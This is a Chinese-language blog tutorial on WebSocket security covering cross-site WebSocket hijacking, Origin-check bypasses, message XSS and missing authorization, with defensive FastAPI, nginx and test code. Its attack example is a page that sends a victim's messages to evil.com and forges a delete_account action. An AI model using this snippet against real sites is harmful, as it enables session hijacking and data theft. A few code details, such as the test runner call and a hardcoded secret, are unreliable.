---
layout: post
title: "WebSocket 安全实战指南：从劫持防护到安全架构"
date: 2026-09-01 09:00:00 +0800
categories: [网络技术, 安全]
tags: [websocket, security, penetration-testing, realtime, cswsh, authentication, wss, secure-coding]
---

## 别把 WebSocket 当普通 HTTP 用

WebSocket 已经无处不在了：实时聊天、协作编辑、金融行情、游戏同步、AI 流式推理——低延迟双向通信让 WebSocket 成了现代 Web 应用的标配。但问题也出在这里：**很多人把 WebSocket 当成"长连接的 HTTP"，用同样的安全思维去配置，结果漏洞百出。**

HTTP 是无状态的请求-响应模型，每个请求独立验证。WebSocket 在握手阶段完成 HTTP Upgrade 后，后续所有帧都不再经过 HTTP 层——这意味着你常用的中间件、认证过滤器、CSRF Token 机制，对 WebSocket 消息全部失效。

这篇文章不讲理论，直接从实战出发：常见攻击手法、防护代码、测试工具，一个不少。

## 一、四大常见 WebSocket 漏洞

### 1. Cross-Site WebSocket Hijacking（CSWSH）

这是 WebSocket 领域最经典的漏洞，本质是 CSRF 的 WebSocket 变种。

**攻击原理：** 浏览器在发起 WebSocket 握手时，会自动携带目标站点的 Cookie（包括 Session Cookie）。如果服务端在握手时**只依赖 Cookie 做身份认证**，而没有验证 Origin 头，攻击者就可以在自己的页面上构造一个 WebSocket 连接，让用户浏览器自动带上 Cookie 完成握手，从而劫持连接。

**攻击代码示例：**

```html
<!-- 攻击者页面 -->
<html>
<body>
  <script>
    // 受害者的浏览器会自动带上 chat.example.com 的 Cookie
    const ws = new WebSocket('wss://chat.example.com/ws');
    ws.onmessage = (e) => {
      // 读到受害者的聊天消息
      fetch('https://evil.com/steal?data=' + encodeURIComponent(e.data));
    };
    ws.onopen = () => {
      // 冒充受害者发送消息
      ws.send(JSON.stringify({ action: 'delete_account' }));
    };
  </script>
</body>
</html>
```

**成因：** 服务端握手接口只校验了 `Cookie` 中的 Session，没有校验 `Origin` 头，也没有使用独立的 WebSocket Token。

### 2. Origin 头校验绕过

即使你校验了 Origin 头，也可能被绕过：

- **Origin: null** —— `<iframe>` 的 `sandbox` 属性、`data:` URI、`file://` 协议页面发出的 WebSocket 请求，Origin 为 `null`
- **Origin 的正则写错** —— 比如用 `indexOf()` 或 `includes()` 匹配 `example.com`，攻击者注册 `attackerexample.com` 即可绕过
- **空 Origin 直接放行** —— 有些实现只在 Origin 非空时才校验，空 Origin 直接通过

### 3. 消息注入与 WebSocket 中的 XSS

WebSocket 不受 HTTP-only Cookie 保护，但消息内容本身可能引入 XSS：

```javascript
// 危险做法：信任 WebSocket 消息内容
ws.onmessage = (e) => {
  document.getElementById('chat').innerHTML = e.data;
  // 如果 data 包含 <script>alert(1)</script>，直接执行
};
```

WebSocket 的 `send()` 方法可以发送任意格式数据（文本或二进制），但**服务端对消息内容的校验**往往被忽略。很多开发者只关注了 HTTP 接口的输入校验，却忘了 WebSocket 通道也需要同等强度的过滤。

### 4. 认证缺失与未授权访问

最常见的错误：

- 只在握手阶段验证身份，连接建立后不再验证后续消息的权限
- 使用全局广播而非用户隔离——WebSocket 房间/频道没有权限检查
- 没有心跳和超时机制——断开连接后 Token 仍然有效，中间人可重放

## 二、安全架构：从握手的每一层开始防护

### 第一层：强制 WSS（WebSocket Secure）

永远不要在生产环境使用 `ws://`。WebSocket 消息不经过 HTTP 头，没有 WSS 加密等于明文传输。配置 Nginx 强制 WSS 升级：

```nginx
server {
    listen 443 ssl;
    server_name chat.example.com;

    ssl_certificate     /etc/ssl/certs/chat.crt;
    ssl_certificate_key /etc/ssl/private/chat.key;

    location /ws {
        proxy_pass http://backend:8080;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        # WebSocket 超时
        proxy_read_timeout 300s;
        proxy_send_timeout 300s;
    }
}
```

### 第二层：Origin 校验（防御 CSWSH）

正确的 Origin 校验实现：

```python
# Python / FastAPI 示例
import re
from fastapi import WebSocket, WebSocketDisconnect, status

ALLOWED_ORIGINS = [
    r"^https://chat\.example\.com$",
    r"^https://[a-z0-9-]+\.example\.com$",
]

def verify_origin(origin: str | None) -> bool:
    if not origin:
        return False
    for pattern in ALLOWED_ORIGINS:
        if re.match(pattern, origin):
            return True
    return False

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    origin = websocket.headers.get("origin")
    if not verify_origin(origin):
        await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
        return

    await websocket.accept()
    # ...
```

**关键细节：** 使用正则精确匹配，不要用 `origin in allowed_origins` 做子串匹配，不要在 Origin 为 `null` 时放行。

### 第三层：独立 WebSocket Token（替代 Cookie 认证）

这是最安全的做法：**放弃依赖 Cookie 做 WebSocket 认证**，改用独立的 Token 机制。

```python
# 握手阶段：客户端通过查询参数传递 Token
# 前端：const ws = new WebSocket('wss://chat.example.com/ws?token=xxx');

import jwt

SECRET = "your-secret-key"

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, token: str = Query(...)):
    try:
        payload = jwt.decode(token, SECRET, algorithms=["HS256"])
        user_id = payload["sub"]
        # 校验 Token 的 scope 是否包含 'websocket'
        if "websocket" not in payload.get("scopes", []):
            await websocket.close(code=4001, reason="insufficient permissions")
            return
    except jwt.ExpiredSignatureError:
        await websocket.close(code=4001, reason="token expired")
        return
    except jwt.InvalidTokenError:
        await websocket.close(code=4001, reason="invalid token")
        return

    await websocket.accept()
    # 将用户信息绑定到连接
    connection_pool[user_id] = websocket
```

前端配合：

```javascript
// 获取 Token（通常来自 REST API 登录响应）
async function connectWebSocket() {
  const token = await getWebSocketToken(); // 短效 Token，有效期 5-10 分钟
  const ws = new WebSocket(`wss://chat.example.com/ws?token=${token}`);

  ws.onclose = (e) => {
    if (e.code === 4001) {
      // Token 过期或无效，重新获取
      reconnect();
    }
  };
}
```

**为什么比 Cookie 安全？** Token 可以限制生效范围（仅 WebSocket 使用），可以设置短有效期，服务端可以主动吊销。Cookie 是浏览器自动携带的，你无法控制它出现在哪个 WebSocket 握手中。

### 第四层：消息级别的权限校验

WebSocket 连接建立后，**每一条消息都需要校验权限**，不能只在握手时检查一次。

```python
class WebSocketMessage:
    action: str
    resource: str
    data: dict

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, token: str = Query(...)):
    user_id = verify_token(token)
    await websocket.accept()

    try:
        while True:
            data = await websocket.receive_json()
            msg = WebSocketMessage(**data)

            # 每条消息独立鉴权
            if not check_permission(user_id, msg.action, msg.resource):
                await websocket.send_json({
                    "error": "permission denied",
                    "action": msg.action
                })
                continue

            # 处理消息
            result = await handle_message(user_id, msg)
            await websocket.send_json(result)
    except WebSocketDisconnect:
        cleanup_connection(user_id)
```

房间/频道级别的权限检查：

```python
# 用户加入聊天室时，检查是否有权限
ROOM_PERMISSIONS = {
    "room:general": {"read": ["user:*"], "write": ["user:*"]},
    "room:admin":  {"read": ["user:admin"], "write": ["user:admin"]},
}

def can_access_room(user_id: str, role: str, room: str, operation: str) -> bool:
    if room not in ROOM_PERMISSIONS:
        return False
    allowed_roles = ROOM_PERMISSIONS[room].get(operation, [])
    return any(
        fnmatch.fnmatch(role, pattern) or fnmatch.fnmatch(user_id, pattern)
        for pattern in allowed_roles
    )
```

### 第五层：速率限制与 DoS 防护

WebSocket 是长连接，攻击者可以在一个连接内发送大量消息，导致服务端资源耗尽。

```python
import asyncio
from collections import defaultdict
from time import time

class RateLimiter:
    def __init__(self, max_messages: int = 60, window: int = 10):
        self.max_messages = max_messages
        self.window = window
        self.usage: dict[str, list[float]] = defaultdict(list)

    def check(self, key: str) -> bool:
        now = time()
        # 清理过期记录
        self.usage[key] = [t for t in self.usage[key] if now - t < self.window]
        if len(self.usage[key]) >= self.max_messages:
            return False
        self.usage[key].append(now)
        return True

rate_limiter = RateLimiter(max_messages=30, window=10)  # 10秒30条

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, user_id: str = "anon"):
    await websocket.accept()
    try:
        while True:
            data = await websocket.receive_json()
            if not rate_limiter.check(user_id):
                await websocket.send_json({"error": "rate limit exceeded"})
                await websocket.close(code=1008, reason="rate limit")
                break
            # 处理消息
    except WebSocketDisconnect:
        pass
```

### 第六层：消息内容消毒与大小限制

无论来自 WebSocket 的消息看着多可信，都要做输入校验：

```python
import json
from typing import Any

MAX_MESSAGE_SIZE = 1024 * 64  # 64KB

def validate_message(data: dict[str, Any]) -> bool:
    # 大小限制
    if len(json.dumps(data)) > MAX_MESSAGE_SIZE:
        return False

    # 类型校验
    if not isinstance(data.get("action"), str):
        return False
    if not isinstance(data.get("data"), dict):
        return False

    # 禁止 key 包含特殊字符（防止 NoSQL 注入）
    for key in data.get("data", {}):
        if not key.isidentifier():
            return False

    return True
```

## 三、安全配置清单

部署 WebSocket 应用前，逐项检查：

| 项目 | 检查内容 | 风险等级 |
|------|---------|---------|
| WSS | 强制使用 `wss://`，禁用 `ws://` | 高危 |
| Origin 校验 | 精确正则匹配，拒绝 `null` Origin | 高危 |
| 独立 Token | 使用 JWT 等 Token 代替 Cookie 认证 | 高危 |
| 消息鉴权 | 每条消息独立校验权限 | 高危 |
| 速率限制 | 每连接/每用户消息频率限制 | 中危 |
| 消息大小限制 | 限制单条消息不超过 64KB | 中危 |
| 输入消毒 | 消息内容转义/过滤，防止 XSS | 中危 |
| 超时断开 | 空闲连接超过阈值自动断开 | 低危 |
| 连接数限制 | 单用户最大连接数限制 | 低危 |
| 日志审计 | 记录连接/断开/鉴权失败事件 | 低危 |

## 四、测试工具与技巧

### 1. 浏览器开发者工具

Chrome DevTools → Network → WS 标签页，可以查看 WebSocket 帧内容、发送测试消息。这是最基础的调试手段。

### 2. wscat（最实用的命令行工具）

```bash
# 安装
npm install -g wscat

# 测试连接
wscat -c wss://chat.example.com/ws

# 带 Origin 头测试（模拟 CSWSH）
wscat -c wss://chat.example.com/ws -H "Origin: https://evil.com"

# 发送消息
Connected (press CTRL+C to quit)
> {"action": "ping", "data": {}}
< {"action": "pong", "data": {"time": 1690000000}}
```

### 3. 自动化测试脚本

```python
# test_websocket_auth.py
import asyncio
import websockets
import pytest

WS_URL = "wss://chat.example.com/ws"

@pytest.mark.asyncio
async def test_cswsh_no_origin():
    """模拟没有 Origin 头的请求"""
    async with websockets.connect(WS_URL, origin=None) as ws:
        await ws.send('{"action": "ping"}')
        response = await asyncio.wait_for(ws.recv(), timeout=5)
        assert "error" in response, "应拒绝无 Origin 的请求"

@pytest.mark.asyncio
async def test_cswsh_evil_origin():
    """模拟来自恶意域名的请求"""
    async with websockets.connect(
        WS_URL,
        origin="https://evil.com"
    ) as ws:
        await ws.send('{"action": "ping"}')
        response = await asyncio.wait_for(ws.recv(), timeout=5)
        assert "error" in response, "应拒绝来自 evil.com 的请求"

@pytest.mark.asyncio
async def test_message_permission():
    """模拟未授权用户访问管理员频道"""
    async with websockets.connect(
        f"{WS_URL}?token=user_token"
    ) as ws:
        await ws.send(json.dumps({
            "action": "join_room",
            "resource": "room:admin",
            "data": {}
        }))
        response = await asyncio.wait_for(ws.recv(), timeout=5)
        data = json.loads(response)
        assert data.get("error") == "permission denied", "应拒绝非管理员访问 admin 房间"

@pytest.mark.asyncio
async def test_rate_limiting():
    """测试速率限制"""
    async with websockets.connect(f"{WS_URL}?token=user_token") as ws:
        for i in range(100):
            await ws.send(json.dumps({"action": "ping", "data": {}}))
            try:
                response = await asyncio.wait_for(ws.recv(), timeout=1)
                if "rate limit" in response:
                    return  # 速率限制生效
            except asyncio.TimeoutError:
                pass
        pytest.fail("应触发速率限制")

asyncio.run(pytest.main([__file__, "-v"]))
```

## 五、总结：WebSocket 安全的三个核心原则

1. **不要信任 Cookie**：Cookie 是 HTTP 的产物，WebSocket 应该用独立的 Token 认证机制。Token 短效、可吊销、作用域明确。

2. **不要信任 Origin 的简单校验**：Origin 校验是防御 CSWSH 的第一道防线，但要用精确正则匹配，拒绝 `null` Origin，并配合 Token 机制做双重验证。

3. **不要只在握手时鉴权**：WebSocket 是长连接，每条消息都需要独立校验权限、速率和内容合法性。一个连接通过了握手不代表它之后的每条消息都是合法的。

把 WebSocket 当作一个独立的传输通道来设计安全模型，而不是 HTTP 的附属品，你的应用才能经得起实战考验。